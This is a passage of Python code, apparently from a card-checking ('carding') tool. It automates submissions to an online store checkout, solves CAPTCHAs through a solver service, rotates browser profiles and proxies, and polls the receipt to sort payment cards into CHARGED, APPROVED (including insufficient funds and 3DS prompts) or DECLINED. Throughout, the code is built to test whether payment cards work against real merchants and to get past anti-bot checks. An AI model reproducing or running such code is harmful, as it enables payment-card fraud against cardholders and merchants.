                if nt: current_tax = nt
                if ntt: current_total = ntt
                time.sleep(0.05)

            check_submit_errors(submit_status, submit_body)
            logger.info(_redact(f"Step 10 status={submit_status} body={submit_body[:280]}"))
            receipt_id = extract_receipt_id(submit_body)

            if not receipt_id and CAPTCHA_ENABLED:
                error_msg = extract_any_error(submit_body) or ""
                captcha_flag = ("CAPTCHA" in error_msg.upper()
                                or "CAPTCHA" in submit_body.upper()
                                or "checkpoint" in submit_body.lower())
                if captcha_flag:
                    logger.warning("captcha challenge — entering solver path")
                    sitekey = (probe_sitekey(client, shop_url, checkout_html, checkout_url)
                               or extract_sitekey(submit_body, proposal5_body, checkout_html))
                    if not sitekey:
                        logger.warning("no sitekey — fill SHOP_SITEKEYS")
                    else:
                        logger.info(f"sitekey={sitekey[:18]}… solving")
                    for cap in range(1, CAPTCHA_RETRIES + 1):
                        _ua  = user_agent if cap == 1 else CAPTCHA_DEFAULT_UA
                        _imp = impersonate if cap == 1 else random.choice(BROWSER_PROFILES)
                        token = solve_captcha(sitekey=sitekey, page_url=checkout_url,
                                              proxy_url=proxy_url,
                                              user_agent=_ua, impersonate=_imp)
                        if not token:
                            logger.warning(f"captcha attempt {cap}: no token")
                            break
                        logger.info(f"captcha attempt {cap}: token ({len(token)} chars)")
                        checkpoint_data = token
                        submit_status, submit_body = send_submit_for_completion(
                            client, shop_url, checkout_url, checkout_token, session_token,
                            stable_id, variant_id, price, submit_id, build_id, source_token,
                            queue_token5, email, addr, delivery_handle, shipping_amount,
                            current_total, pci_session_id, attempt_token, currency, country,
                            signed_handles, is_digital=is_digital,
                            tax_amount=current_tax, checkpoint_data=checkpoint_data)
                        check_submit_errors(submit_status, submit_body)
                        logger.info(_redact(f"Step 10 retry {cap}: status={submit_status} body={submit_body[:280]}"))
                        receipt_id = extract_receipt_id(submit_body)
                        if receipt_id: break
                        _fresh = extract_checkpoint_data(submit_body)
                        if _fresh: checkpoint_data = _fresh
                        error_msg = extract_any_error(submit_body) or error_msg
                        if "CAPTCHA" not in submit_body.upper(): break
                    if not receipt_id:
                        result.status = CheckStatus.DECLINED
                        result.status_code = "CAPTCHA_REQUIRED"
                        result.retryable = False
                        result.error = Exception("CAPTCHA_REQUIRED")
                        return result
                if not receipt_id:
                    if error_msg:
                        result.status = CheckStatus.DECLINED
                        result.status_code = error_msg
                        result.error = Exception(error_msg)
                        result.retryable = any(kw in error_msg.lower()
                                               for kw in ("inventory", "retry", "try again", "generic"))
                    else:
                        result.status = CheckStatus.ERROR
                        result.error = Exception("Step 10: no receiptId and no error message")
                        result.retryable = True
                    return result

            if not receipt_id:
                error_msg = extract_any_error(submit_body)
                if error_msg:
                    result.status = CheckStatus.DECLINED
                    result.status_code = error_msg
                    result.error = Exception(error_msg)
                else:
                    result.status = CheckStatus.ERROR
                    result.error = Exception("Step 10: no receiptId")
                    result.retryable = True
                return result

            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("Step 10: could not extract sessionToken")
        except Exception as e:
            result.status = CheckStatus.ERROR; result.retryable = True
            result.error = e
            return result

        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        type_name_re  = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')

        for poll_num in range(1, 21):
            try:
                _, poll_body = send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id,
                    receipt_id, receipt_session_token)
                receipt_type = ""
                m = type_name_re.search(poll_body)
                if m: receipt_type = m.group(1)
                status_code = extract_receipt_status_code(poll_body, receipt_type)
                result.status_code = status_code
                logger.info(_redact(f"poll#{poll_num} type={receipt_type!r} body={poll_body[:220]}"))

                if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
                    result.status = CheckStatus.CHARGED
                    result.status_code = "ORDER_PLACED"
                    try:
                        pj = json.loads(poll_body)
                        ro = pj.get("data", {}).get("receipt", {})
                        cu = ro.get("confirmationPage", {}).get("url", "")
                        result.receipt_url = cu or checkout_url
                    except Exception:
                        result.receipt_url = checkout_url
                    return result

                if receipt_type == "ActionRequiredReceipt":
                    result.status = CheckStatus.APPROVED
                    result.status_code = "3DS_AUTHENTICATION"
                    return result

                if receipt_type == "FailedReceipt":
                    error_code = ""
                    m2 = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
                    if m2: error_code = m2.group(1)
                    if "CAPTCHA" in error_code:
                        result.status = CheckStatus.DECLINED
                        result.status_code = "CAPTCHA_REQUIRED"
                        result.retryable = False
                        result.error = Exception("CAPTCHA_REQUIRED")
                        return result
                    elif error_code == "INSUFFICIENT_FUNDS":
                        result.status = CheckStatus.APPROVED
                        result.status_code = "INSUFFICIENT_FUNDS"
                        return result
                    elif error_code == "CARD_DECLINED":
                        result.status = CheckStatus.DECLINED
                        result.error = Exception(error_code)
                        return result
                    elif error_code == "GENERIC_ERROR":
                        result.status = CheckStatus.DECLINED
                        result.status_code = "CARD_DECLINED"
                        result.error = Exception("CARD_DECLINED")
                        return result
                    else:
                        if "InventoryReservationFailure" in poll_body:
                            result.status = CheckStatus.ERROR; result.retryable = True
                            return result
                        _signals = ["fraud", "not supported", "brand", "suspected", "risk",
                                    "shipping", "artifact", "transformer",
                                    "not available", "cannot be placed"]
                        if any(s in (error_code + " " + poll_body).lower() for s in _signals):
                            result.status = CheckStatus.ERROR; result.retryable = True
                            result.error = Exception(error_code)
                            return result
                        result.status = CheckStatus.DECLINED
                        result.error = Exception(error_code)
                        return result

                delay = 500
                m3 = poll_delay_re.search(poll_body)
                if m3:
                    try:
                        d = int(m3.group(1))
                        if d > 0: delay = d
                    except ValueError: pass
                time.sleep(min(delay, 3000) / 1000.0)
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error = Exception(f"poll {poll_num} failed: {e}")
                return result

        result.status = CheckStatus.ERROR
        result.retryable = True
        result.error = Exception("exceeded 20 poll attempts")
        return result

    finally:
        client.close()